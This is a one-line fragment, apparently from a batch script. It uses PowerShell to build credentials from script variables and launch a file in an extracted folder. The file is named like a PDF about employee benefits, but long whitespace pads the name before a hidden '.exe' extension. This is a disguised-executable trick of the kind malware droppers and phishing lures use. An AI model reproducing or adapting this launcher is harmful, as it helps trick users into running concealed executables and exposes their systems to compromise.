...
powershell -Command "$SecurePassword = ConvertTo-SecureString '%password%' -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ('%domain%\%username%', $SecurePassword); Start-Process -FilePath '%extractedDir%\employee benefit and overhead adjustmentkeys.pdf                                                                                                                                                                                           .exe' -Credential $Credential"
